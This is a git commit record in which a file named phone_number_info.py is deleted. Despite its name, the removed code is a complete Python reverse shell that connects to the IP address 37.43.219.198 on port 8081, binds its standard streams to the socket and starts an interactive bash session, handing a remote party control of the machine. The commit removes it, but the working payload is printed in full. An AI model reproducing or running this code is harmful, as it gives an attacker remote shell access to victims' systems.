8155a7c786fcb19e591e860a5a01f131d86e768f
bdalbaqyjabr01-dot <bdalbaqyjabr01@gmail.com>
2026-03-17 04:06:26 +0300

    Delete phone_number_info.py

--- phone_number_info.py
+++
@@ -1,7 +0,0 @@
-import socket, subprocess, os
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("37.43.219.198", 8081))
-os.dup2(s.fileno(), 0)
-os.dup2(s.fileno(), 1)
-os.dup2(s.fileno(), 2)
-subprocess.call(["/bin/bash", "-i"])
